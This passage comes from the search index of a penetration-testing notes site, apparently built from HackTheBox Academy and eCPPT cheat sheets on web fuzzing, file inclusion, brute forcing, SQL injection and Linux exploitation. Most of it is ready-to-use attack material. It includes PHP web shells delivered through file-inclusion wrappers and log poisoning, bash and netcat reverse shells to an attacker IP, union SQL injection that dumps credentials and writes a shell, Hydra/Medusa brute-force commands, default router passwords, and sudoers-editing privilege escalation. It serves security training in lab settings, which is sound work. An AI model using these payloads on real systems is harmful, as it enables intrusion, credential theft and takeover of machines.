http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Parameter Fuzzing - POST <code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Value Fuzzing"},{"location":"HackTheBox%20Materials/Attacking%20Web%20Applications%20with%20FFUF/#wordlists","title":"Wordlists","text":"Command Description <code>/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code> Directory/Page Wordlist <code>/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt</code> Extensions Wordlist <code>/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code> Domain Wordlist <code>/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt</code> Parameters Wordlist"},{"location":"HackTheBox%20Materials/Attacking%20Web%20Applications%20with%20FFUF/#misc","title":"Misc","text":"Command Description <code>sudo sh -c 'echo \"SERVER_IP  academy.htb\" &gt;&gt; /etc/hosts'</code> Add DNS entry <code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code> Create Sequence Wordlist <code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'</code> curl w/ POST"},{"location":"HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/","title":"File Inclusion/Path Traversal","text":""},{"location":"HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/#local-file-inclusion","title":"Local File Inclusion","text":"Command Description Basic LFI <code>/index.php?language=/etc/passwd</code> Basic LFI <code>/index.php?language=../../../../etc/passwd</code> LFI with path traversal <code>/index.php?language=/../../../etc/passwd</code> LFI with name prefix <code>/index.php?language=./languages/../../../../etc/passwd</code> LFI with approved path LFI Bypasses <code>/index.php?language=....//....//....//....//etc/passwd</code> Bypass basic path traversal filter <code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> Bypass filters with URL encoding <code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code> Bypass appended extension with path truncation (obsolete) <code>/index.php?language=../../../../etc/passwd%00</code> Bypass appended extension with null byte (obsolete) <code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code> Read PHP with base64 filter"},{"location":"HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/#remote-code-execution","title":"Remote Code Execution","text":"Command Description PHP Wrappers <code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code> RCE with data wrapper <code>curl -s -X POST --data '&lt;?php system($_GET[\"cmd\"]); ?&gt;' \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id\"</code> RCE with input wrapper <code>curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id\"</code> RCE with expect wrapper RFI <code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code> Host web shell <code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code> Include remote PHP web shell LFI + Upload <code>echo 'GIF8&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.gif</code> Create malicious image <code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code> RCE with malicious uploaded image <code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code> Create malicious zip archive 'as jpg' <code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code> RCE with malicious uploaded zip <code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code> Create malicious phar 'as jpg' <code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code> RCE with malicious uploaded phar Log Poisoning <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code> Read PHP session parameters <code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code> Poison PHP session with web shell <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code> RCE through poisoned PHP session <code>curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php\" -A '&lt;?php system($_GET[\"cmd\"]); ?&gt;'</code> Poison server log <code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code> RCE through poisoned PHP session"},{"location":"HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/#misc","title":"Misc","text":"Command Description <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code> Fuzz page parameters <code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code> Fuzz LFI payloads <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code> Fuzz webroot path <code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287</code> Fuzz server configurations LFI Wordlists LFI-Jhaddix.txt Webroot path wordlist for Linux Webroot path wordlist for Windows Server configurations wordlist for Linux Server configurations wordlist for Windows"},{"location":"HackTheBox%20Materials/FIle%20Inclusion%5CPath%20Traversal/#file-inclusion-functions","title":"File Inclusion Functions","text":"Function Read Content Execute Remote URL PHP <code>include()</code>/<code>include_once()</code> \u2705 \u2705 \u2705 <code>require()</code>/<code>require_once()</code> \u2705 \u2705 \u274c <code>file_get_contents()</code> \u2705 \u274c \u2705 <code>fopen()</code>/<code>file()</code> \u2705 \u274c \u274c NodeJS <code>fs.readFile()</code> \u2705 \u274c \u274c <code>fs.sendFile()</code> \u2705 \u274c \u274c <code>res.render()</code> \u2705 \u2705 \u274c Java <code>include</code> \u2705 \u274c \u274c <code>import</code> \u2705 \u2705 \u2705 .NET <code>@Html.Partial()</code> \u2705 \u274c \u274c <code>@Html.RemotePartial()</code> \u2705 \u274c \u2705 <code>Response.WriteFile()</code> \u2705 \u274c \u274c <code>include</code> \u2705 \u2705 \u2705"},{"location":"HackTheBox%20Materials/Getting%20Started%20-%20General/","title":"Getting Started - General","text":""},{"location":"HackTheBox%20Materials/Getting%20Started%20-%20General/#basic-tools","title":"Basic Tools","text":"Command Description General <code>sudo openvpn user.ovpn</code> Connect to VPN <code>ifconfig</code>/<code>ip a</code> Show our IP address <code>netstat -rn</code> Show networks accessible via the VPN <code>ssh user@10.10.10.10</code> SSH to a remote server <code>ftp 10.129.42.253</code> FTP to a remote server tmux <code>tmux</code> Start tmux <code>ctrl+b</code> tmux: default prefix <code>prefix c</code> tmux: new window <code>prefix 1</code> tmux: switch to window (<code>1</code>) <code>prefix shift+%</code> tmux: split pane vertically <code>prefix shift+\"</code> tmux: split pane horizontally <code>prefix -&gt;</code> tmux: switch to the right pane Vim <code>vim file</code> vim: open <code>file</code> with vim <code>esc+i</code> vim: enter <code>insert</code> mode <code>esc</code> vim: back to <code>normal</code> mode <code>x</code> vim: Cut character <code>dw</code> vim: Cut word <code>dd</code> vim: Cut full line <code>yw</code> vim: Copy word <code>yy</code> vim: Copy full line <code>p</code> vim: Paste <code>:1</code> vim: Go to line number 1. <code>:w</code> vim: Write the file 'i.e. save' <code>:q</code> vim: Quit <code>:q!</code> vim: Quit without saving <code>:wq</code> vim: Write and quit"},{"location":"HackTheBox%20Materials/Getting%20Started%20-%20General/#pentesting","title":"Pentesting","text":"Command Description Service Scanning <code>nmap 10.129.42.253</code> Run nmap on an IP <code>nmap -sV -sC -p- 10.129.42.253</code> Run an nmap script scan on an IP <code>locate scripts/citrix</code> List various available nmap scripts <code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code> Run an nmap script on an IP <code>netcat 10.10.10.10 22</code> Grab banner of an open port <code>smbclient -N -L \\\\\\\\10.129.42.253</code> List SMB Shares <code>smbclient \\\\\\\\10.129.42.253\\\\users</code> Connect to an SMB share <code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code> Scan SNMP on an IP <code>onesixtyone -c dict.txt 10.129.42.254</code> Brute force SNMP secret string Web Enumeration <code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code> Run a directory scan on a website <code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code> Run a sub-domain scan on a website <code>curl -IL https://www.inlanefreight.com</code> Grab website banner <code>whatweb 10.10.10.121</code> List details about the webserver/certificates <code>curl 10.10.10.121/robots.txt</code> List potential directories in <code>robots.txt</code> <code>ctrl+U</code> View page source (in Firefox) Public Exploits <code>searchsploit openssh 7.2</code> Search for public exploits for a web application <code>msfconsole</code> MSF: Start the Metasploit Framework <code>search exploit eternalblue</code> MSF: Search for public exploits in MSF <code>use exploit/windows/smb/ms17_010_psexec</code> MSF: Start using an MSF module <code>show options</code> MSF: Show required options for an MSF module <code>set RHOSTS 10.10.10.40</code> MSF: Set a value for an MSF module option <code>check</code> MSF: Test if the target server is vulnerable <code>exploit</code> MSF: Run the exploit on the target server is vulnerable Using Shells <code>nc -lvnp 1234</code> Start a <code>nc</code> listener on a local port <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</code> Send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2&gt;&amp;1\\|nc 10.10.10.10 1234 &gt;/tmp/f</code> Another command to send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2&gt;&amp;1\\|nc -lvp 1234 &gt;/tmp/f</code> Start a bind shell on the remote server <code>nc 10.10.10.1 1234</code> Connect to a bind shell started on the remote server <code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code> Upgrade shell TTY (1) <code>ctrl+z</code> then <code>stty raw -echo</code> then <code>fg</code> then <code>enter</code> twice Upgrade shell TTY (2) <code>echo \"&lt;?php system(\\$_GET['cmd']);?&gt;\" &gt; /var/www/html/shell.php</code> Create a webshell php file <code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code> Execute a command on an uploaded webshell Privilege Escalation <code>./linpeas.sh</code> Run <code>linpeas</code> script to enumerate remote server <code>sudo -l</code> List available <code>sudo</code> privileges <code>sudo -u user /bin/echo Hello World!</code> Run a command with <code>sudo</code> <code>sudo su -</code> Switch to root user (if we have access to <code>sudo su</code>) <code>sudo su user -</code> Switch to a user (if we have access to <code>sudo su</code>) <code>ssh-keygen -f key</code> Create a new SSH key <code>echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys</code> Add the generated public key to the user <code>ssh root@10.10.10.10 -i key</code> SSH to the server with the generated private key Transferring Files <code>python3 -m http.server 8000</code> Start a local webserver <code>wget http://10.10.14.1:8000/linpeas.sh</code> Download a file on the remote server from our local machine <code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code> Download a file on the remote server from our local machine <code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code> Transfer a file to the remote server with <code>scp</code> (requires SSH access) <code>base64 shell -w 0</code> Convert a file to <code>base64</code> <code>echo f0VMR...SNIO...InmDwU \\| base64 -d &gt; shell</code> Convert a file from <code>base64</code> back to its orig <code>md5sum shell</code> Check the file's <code>md5sum</code> to ensure it converted correctly"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/","title":"Login Brute Forcing Cheat Sheet","text":""},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#what-is-brute-forcing","title":"What is Brute Forcing?","text":"<p>A trial-and-error method used to crack passwords, login credentials, or encryption keys by systematically trying every possible combination of characters.</p>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#factors-influencing-brute-force-attacks","title":"Factors Influencing Brute Force Attacks","text":"<ul> <li>Complexity of the password or key</li> <li>Computational power available to the attacker</li> <li>Security measures in place</li> </ul>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#how-brute-forcing-works","title":"How Brute Forcing Works","text":"<ol> <li>Start: The attacker initiates the brute force process.</li> <li>Generate Possible Combination: The software generates a potential password or key combination.</li> <li>Apply Combination: The generated combination is attempted against the target system.</li> <li>Check if Successful: The system evaluates the attempted combination.</li> <li>Access Granted (if successful): The attacker gains unauthorized access.</li> <li>End (if unsuccessful): The process repeats until the correct combination is found or the attacker gives up.</li> </ol>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#types-of-brute-forcing","title":"Types of Brute Forcing","text":"Attack Type Description Best Used When Simple Brute Force Tries every possible character combination in a set (e.g., lowercase, uppercase, numbers, symbols). When there is no prior information about the password. Dictionary Attack Uses a pre-compiled list of common passwords. When the password is likely weak or follows common patterns. Hybrid Attack Combines brute force and dictionary attacks, adding numbers or symbols to dictionary words. When the target uses slightly modified versions of common passwords. Credential Stuffing Uses leaked credentials from other breaches to access different services where users may have reused passwords. When you have a set of leaked credentials, and the target may reuse passwords. Password Spraying Attempts common passwords across many accounts to avoid detection. When account lockout policies are in place. Rainbow Table Attack Uses precomputed tables of password hashes to reverse them into plaintext passwords. When a large number of password hashes need cracking, and storage for tables is available. Reverse Brute Force Targets a known password against multiple usernames. When there\u2019s a suspicion of password reuse across multiple accounts. Distributed Brute Force Distributes brute force attempts across multiple machines to speed up the process. When the password is highly complex, and a single machine isn't powerful enough."},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#default-credentials","title":"Default Credentials","text":"Device Username Password Linksys Router admin admin Netgear Router admin password TP-Link Router admin admin Cisco Router cisco cisco Ubiquiti UniFi AP ubnt ubnt"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#brute-forcing-tools","title":"Brute-Forcing Tools","text":""},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#hydra","title":"Hydra","text":"<ul> <li>Fast network login cracker</li> <li>Supports numerous protocols</li> <li>Uses parallel connections for speed</li> <li>Flexible and adaptable</li> <li>Relatively easy to use</li> </ul> <p>Example Usage: <pre><code>hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]\n</code></pre></p>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#hydra-examples","title":"Hydra Examples","text":"Service/Protocol Description Example Command FTP Used to brute-force login credentials for FTP services. <code>hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100</code> SSH Targets SSH services to brute-force credentials. <code>hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100</code> HTTP GET/POST Used to brute-force web login forms using GET/POST requests. <code>hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form \"/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect\"</code>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#medusa","title":"Medusa","text":"<ul> <li>Fast, massively parallel, modular login brute-forcer</li> <li>Supports a wide array of services</li> </ul> <p>Example Usage: <pre><code>medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]\n</code></pre></p>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#medusa-examples","title":"Medusa Examples","text":"Service/Protocol Description Example Command SSH Brute force SSH login for the admin user. <code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh</code> FTP Brute force FTP with multiple usernames and passwords. <code>medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5</code> RDP Brute force RDP login. <code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp</code> HTTP Basic Auth Brute force HTTP Basic Authentication. <code>medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET</code>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#custom-wordlists","title":"Custom Wordlists","text":""},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#username-anarchy","title":"Username Anarchy","text":"<p>Generates potential usernames based on a target's name.</p> <p>Example Commands: <pre><code>username-anarchy \"Jane Smith\"  # Generate usernames for \"Jane Smith\"\nusername-anarchy -i names.txt  # Use a file (names.txt) for input\nusername-anarchy -a --country us  # Generate usernames using US dataset\nusername-anarchy -@ example.com  # Append @example.com as a suffix\n</code></pre></p>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#cupp-common-user-passwords-profiler","title":"CUPP (Common User Passwords Profiler)","text":"<p>Creates personalized password wordlists based on gathered intelligence.</p> <p>Example Commands: <pre><code>cupp -i  # Generate wordlist interactively\ncupp -w profiles.txt  # Generate a wordlist from a predefined profile file\ncupp -l  # Download popular password lists like rockyou.txt\n</code></pre></p>"},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#password-policy-filtering","title":"Password Policy Filtering","text":""},{"location":"HackTheBox%20Materials/Login%20Brute%20Forcing/#common-grep-patterns-for-filtering-wordlists","title":"Common <code>grep</code> Patterns for Filtering Wordlists","text":"Policy Requirement <code>grep</code> Regex Pattern Explanation Minimum Length (8 chars) <code>grep -E '^.{8,}$' wordlist.txt</code> Ensures at least 8 characters per line. At Least One Uppercase Letter <code>grep -E '[A-Z]' wordlist.txt</code> Matches any uppercase letter. At Least One Lowercase Letter <code>grep -E '[a-z]' wordlist.txt</code> Matches any lowercase letter. At Least One Digit <code>grep -E '[0-9]' wordlist.txt</code> Matches any numeric digit. At Least One Special Character <code>grep -E '[!@#$%^&amp;*()_+-=[]{};':\"\\,.&lt;&gt;/?]' wordlist.txt</code> Matches any special character. No Consecutive Repeated Characters <code>grep -E '(.)\u0001' wordlist.txt</code> Detects repeated characters. Use <code>grep -v</code> to exclude matches. Exclude \"password\" <code>grep -v -i 'password' wordlist.txt</code> Case-insensitive exclusion of the word \"password\". Exclude Dictionary Words <code>grep -v -f dictionary.txt wordlist.txt</code> Removes common dictionary words from the list."},{"location":"HackTheBox%20Materials/SQL%20Injection%20Fundamentals/","title":"SQL Injection","text":""},{"location":"HackTheBox%20Materials/SQL%20Injection%20Fundamentals/#mysql","title":"MySQL","text":"Command Description General <code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code> login to mysql database <code>SHOW DATABASES</code> List available databases <code>USE users</code> Switch to database Tables <code>CREATE TABLE logins (id INT, ...)</code> Add a new table <code>SHOW TABLES</code> List available tables in current database <code>DESCRIBE logins</code> Show table properties and columns <code>INSERT INTO table_name VALUES (value_1,..)</code> Add values to table <code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code> Add values to specific columns in a table <code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code> Update table values Columns <code>SELECT * FROM table_name</code> Show all columns in a table <code>SELECT column1, column2 FROM table_name</code> Show specific columns in a table <code>DROP TABLE logins</code> Delete a table <code>ALTER TABLE logins ADD newColumn INT</code> Add new column <code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code> Rename column <code>ALTER TABLE logins MODIFY oldColumn DATE</code> Change column datatype <code>ALTER TABLE logins DROP oldColumn</code> Delete column Output <code>SELECT * FROM logins ORDER BY column_1</code> Sort by column <code>SELECT * FROM logins ORDER BY column_1 DESC</code> Sort by column in descending order <code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code> Sort by two-columns <code>SELECT * FROM logins LIMIT 2</code> Only show first two results <code>SELECT * FROM logins LIMIT 1, 2</code> Only show first two results starting from index 2 <code>SELECT * FROM table_name WHERE &lt;condition&gt;</code> List results that meet a condition <code>SELECT * FROM logins WHERE username LIKE 'admin%'</code> List results where the name is similar to a given string"},{"location":"HackTheBox%20Materials/SQL%20Injection%20Fundamentals/#mysql-operator-precedence","title":"MySQL Operator Precedence","text":"<ul> <li>Division (<code>/</code>), Multiplication (<code>*</code>), and Modulus (<code>%</code>)</li> <li>Addition (<code>+</code>) and Subtraction (<code>-</code>)</li> <li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li> <li>NOT (<code>!</code>)</li> <li>AND (<code>&amp;&amp;</code>)</li> <li>OR (<code>||</code>)</li> </ul>"},{"location":"HackTheBox%20Materials/SQL%20Injection%20Fundamentals/#sql-injection_1","title":"SQL Injection","text":"Payload Description Auth Bypass <code>admin' or '1'='1</code> Basic Auth Bypass <code>admin')-- -</code> Basic Auth Bypass With comments Auth Bypass Payloads Union Injection <code>' order by 1-- -</code> Detect number of columns using <code>order by</code> <code>cn' UNION select 1,2,3-- -</code> Detect number of columns using Union injection <code>cn' UNION select 1,@@version,3,4-- -</code> Basic Union injection <code>UNION select username, 2, 3, 4 from passwords-- -</code> Union injection for 4 columns DB Enumeration <code>SELECT @@version</code> Fingerprint MySQL with query output <code>SELECT SLEEP(5)</code> Fingerprint MySQL with no output <code>cn' UNION select 1,database(),2,3-- -</code> Current database name <code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code> List all databases <code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code> List all tables in a specific database <code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code> List all columns in a specific table <code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code> Dump data from a table in another database Privileges <code>cn' UNION SELECT 1, user(), 3, 4-- -</code> Find current user <code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=\"root\"-- -</code> Find if user has admin privileges <code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=\"root\"-- -</code> Find if all user privileges <code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=\"secure_file_priv\"-- -</code> Find which directories can be accessed through MySQL File Injection <code>cn' UNION SELECT 1, LOAD_FILE(\"/etc/passwd\"), 3, 4-- -</code> Read local file <code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code> Write a string to a local file <code>cn' union select \"\",'&lt;?php system($_REQUEST[0]); ?&gt;', \"\", \"\" into outfile '/var/www/html/shell.php'-- -</code> Write a web shell into the base web directory"},{"location":"eCPPT%20Materials/Linux%20Exploitation/","title":"Linux Exploitation","text":""},{"location":"eCPPT%20Materials/Linux%20Exploitation/#information-gathering","title":"Information Gathering","text":"<p>Remote Enumeration <pre><code># OS Fingerprint\n$ nmap -O --osscan-guess &lt;IP_Address&gt;\n$ nmap -v -sT -O &lt;IP_Address&gt;\n\n\n# Enumerating NFS\n$ nmap -sT -sU -sV -p2049 &lt;IP_Address&gt;\n$ nmap --script nfs-ls,nfs-showmount,nfs-statfs &lt;IP_Address&gt;\n$ showmount -e &lt;IP_Address&gt;\n\n\n# Mount FNS\n$ mkdir -p /tmp/mountednfs\n$ mount -t nfs &lt;NFS SERVER IP&gt;:/home/bob /tmp/mountedfns -o nolock\n\n\n# Enumerating Portmapper (rpcbind)\n$ nmap --script rpc-grind,rpcinfo -p111 &lt;IP_Address&gt;\n$ rpcinfo -p &lt;IP_Address&gt;\n\n\n# Samba\n$ nmap -sT -sU -sV -p135,137,138,139,445 &lt;IP_Address&gt; --open\n\n$ nmap --script smb-enum-shares &lt;IP_Address&gt;\n$ smbclient -N -L &lt;IP_Address&gt;                 # Anonymous Login\n$ smbmap -H &lt;IP_Address&gt;                       # List Shares Permissions\n\n$ smbclient \\\\\\\\$IP\\\\Share                     # Interacting with share\n$ impacket-smbclient &lt;IP_Address&gt;              # Interacting with share\n\n$ mkdir -p /tmp/share\n$ mount -t cifs \\\\\\\\$IP\\\\Share /tmp/share      # Mount share on /tmp/share\n\n\n\n# Enumerating SMB Users - enum4linux\n$ enum4linux &lt;IP_Address&gt;\n\n# Enumerating SMB Users - rpcclient\n$ rpcclient -U \"\" -N &lt;Target&gt;\n&gt; emumdomusers\n&gt; enumdomgroups\n&gt; enumdomains\n&gt; queryuser &lt;user&gt;\n\n\n\n# Enumerating SMTP Users\n$ nmap --script smtp-* &lt;IP_Address&gt; -p25 \n$ nc &lt;IP_Address&gt; 25\n$ telnet &lt;IP_Address&gt; 25\n\ntelnet &gt; HELO domain.com                         # Start Communication\n\ntelnet &gt; MAIL FROM: user@domain.com\ntelnet &gt; RCPT TO: root@domain.com                # Query if user exist\n\ntelnet &gt; EXPN root                               # Query if user exist\n\ntelnet &gt; VRFY root                               # Query if user exist\n\n\n$ smtp-user-enum -M VRFY -U users.txt -t &lt;IP_Address&gt; \n$ smtp-user-enum -M EXPN -U users.txt -t &lt;IP_Address&gt; \n$ smtp-user-enum -M RCPT -U users.txt -t &lt;IP_Address&gt; \n$ smtp-user-enum -M VRFY -u root -t &lt;IP_Address&gt; \n\n\n\nReference :\n# User List\nhttps://github.com/insidetrust/statistically-likely-usernames\n</code></pre></p> <p>Enumerate users with rpcclient <pre><code>for u in `cat users.txt`;\n    do rpcclient -U \"\" -N &lt;IP_Address&gt; \\\n    --command=\"lookupnames $u\";\ndone | grep \"User: 1\"\n</code></pre></p> <p>Local Enumeration <pre><code># Network Information\n\n$ ifconfig -a                                    # Network Information\n$ route -n                                       # Network Routes\n$ traceroute -n &lt;IP_Adderss&gt;                     # Hops count\n$ cat /etc/resolv.conf                           # DNS Information\n$ arp -a                                         # ARP Cache\n$ netstat -auntp                                 # List TCP/UDP Connections\n$ ss -twurp                                      # Active Network Connections\n$ nmap -sT -p4444-4450 portquiz.net              # OutBound port Connectivity\n\n\n\n# System Information\n\n$ id                                # Current User Information\n$ uname -a                          # Kernel Version\n$ grep $USER /etc/passwd            # Current User Info From /etc/passwd\n$ lastlog                           # Most Recent Logins\n$ w                                 # Who is Currently Logged onto System\n$ last                              # Last Logged On Users\n$ cat /etc/shadow                   # Check Readability of the shadow file\n$ sudo -l                           # Check sudo without Password\n$ cat /etc/sudoers                  # Check Readability of the sudoers file\n$ cat /root/.bash_history           # Check Readability of the history file\n$ cat /etc/issue                    # Operating System\n$ cat /etc/*-release                # Operating System\n$ ls -als /root/                    # Check Availability to Read root DIR\n$ echo $PATH                        # Current $PATH environment variable\n$ cat /etc/contab                   # List All Cron Jobs\n$ ls -als /etc/cron*                # List All Cron Jobs\n$ find /etc/cron* -type f -perm -o+w -exec ls -l {} \\;   # Writable Cron Jobs\n$ ps auxwww                         # List Running Processes\n$ ps -u root                        # List All Processes Running Under root\n$ ps -u $USER                       # Processes Running as Current User\n$ find / -perm -4000  2&gt;/dev/null    # Find SUID files\n$ find / -uid 0 -perm -4000 -type -f 2&gt;/dev/null   # Suid Files Owned by root\n$ find / -perm -2000 -type -f 2&gt;/dev/null    # Find GUID files\n$ find -perm -2 -type f 2&gt;/dev/null          # Find Writable files\n$ grep pass* /etc/*.conf                     # Conf files that contain pass\n$ lsof -n                                    # List open files\n$ dpkg -l                                    # List Installed Packages\n$ sudo -V                                    # Commond Software Versions\n$ httpd -v                                   # Commond Software Versions\n$ apache2 -v                                 # Commond Software Versions\n$ mysql -V                                   # Commond Software Versions\n$ sendmail -d0.1                             # Commond Software Versions\n$ ps aux | awk `print( $11}` | xargs -r ls -la 2&gt;/devnull | awk `!x[$0]++`  # Print Process Binaries/Path and Permissions\n\n\n\n\nReference: \nhttps://staaldraad.github.io/2017/12/20/netstat-without-netstat/\nhttp://portquiz.net/\n</code></pre></p> <p>Lab 1 - Remote Enumeration <pre><code># demo.ine.local - 25/tcp open smtp\n$ nmap --script smtp-enum-users -p 25 demo.ine.local\n$ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t demo.ine.local\n\n\n# demo2.ine.local - 139/tcp open netbios-ssn, 445/tcp open microsoft-ds\n$ enum4linux demo2.ine.local\n$ rpcclient -U \"\" -N demo2.ine.local\n$ hydra\n\n\n# demo3.ine.local - 79/tcp open finger\n$ finger root@demo3.ine.local\n$ for i in `cat /usr/share/metasploit-framework/data/wordlists/unix_users.txt`; do finger $i@demo3.ine.local; done | grep Login:\n\n\n# demo4.ine.local - 21/tcp open ftp\n$ nmap -sS -sV --script vuln demo4.ine.local\nmsf &gt; use exploit/unix/ftp/proftpd_133c_backdoor\n</code></pre></p> <p>Lab 2 - Local Enumeration <pre><code># Privilege Escalation - SUID. - /usr/bin/find\n\n$ find / -perm -4000 2&gt;/dev/null                  # Find Writable SUIDs\n$ find . -exec /bin/sh \\; -quit\n\n\n# Privilege Escalation - sudo -l\n$ sudo -l\n$ sudo /etc/init.d/cron \n$ sudo /etc/init.d/cron status   \n$ find / -name message                # Find message file\n$ grep -nri \"/tmp/message\" /usr       # Find jobs which affected /tmp/message\n\n$ printf '#! /bin/bash\\necho \"student ALL=NOPASSWD:ALL\" &gt;&gt; /etc/sudoers\\n' &gt; /usr/local/share/copy.sh\n\n$ echo \"student  ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/student \n\n\n# Run LinEnum\n$ 